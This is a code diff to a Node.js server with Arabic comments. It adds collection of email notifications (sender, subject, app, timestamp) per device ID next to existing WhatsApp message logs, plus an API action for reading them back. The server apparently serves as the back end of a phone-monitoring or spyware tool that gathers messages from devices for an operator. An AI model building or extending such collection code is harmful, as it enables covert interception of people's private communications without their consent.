@@ -69,7 +69,6 @@ app.post('/upload.php', (req, res) => {
             let waMessages = [];
             if (fs.existsSync(waFile)) waMessages = JSON.parse(fs.readFileSync(waFile, 'utf8'));
             
-            // ✅ تحويل التاريخ إلى milliseconds
             let waTimestamp = Date.now();
             if (data.timestamp) {
                 try {
@@ -95,6 +94,32 @@ app.post('/upload.php', (req, res) => {
             fs.writeFileSync(waFile, JSON.stringify(waMessages, null, 2));
             updateDevicesList(deviceId, null);
             return res.json({ success: true, wa_count: waMessages.length });
+        }
+        
+        // ✅ حفظ رسائل البريد الإلكتروني
+        if (data.type === 'email_message') {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            
+            const emailFile = path.join(deviceDir, 'emails.json');
+            let emails = [];
+            if (fs.existsSync(emailFile)) emails = JSON.parse(fs.readFileSync(emailFile, 'utf8'));
+            
+            // ✅ الجديد فوق القديم
+            emails.unshift({
+                app_name: data.app_name || 'Email',
+                package_name: data.package_name || '',
+                sender: data.sender || 'غير معروف',
+                subject: data.subject || '',
+                timestamp: data.timestamp || Date.now()
+            });
+            
+            if (emails.length > 2000) emails = emails.slice(0, 2000);
+            
+            fs.writeFileSync(emailFile, JSON.stringify(emails, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, email_count: emails.length });
         }
         
         const deviceId = data.device_id || 'unknown';
@@ -255,7 +280,6 @@ app.get('/api.php', (req, res) => {
             return res.json([]);
         }
         
-        // ✅ حذف دردشة واتساب كاملة
         if (action === 'delete_whatsapp_chat') {
             const sender = req.query.sender;
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
@@ -271,6 +295,13 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_whatsapp') {
             const waFile = path.join(dataDir, deviceId, 'whatsapp_messages.json');
             if (fs.existsSync(waFile)) return res.json(JSON.parse(fs.readFileSync(waFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع رسائل البريد
+        if (action === 'get_emails') {
+            const emailFile = path.join(dataDir, deviceId, 'emails.json');
+            if (fs.existsSync(emailFile)) return res.json(JSON.parse(fs.readFileSync(emailFile, 'utf8')));
             return res.json([]);
         }
         
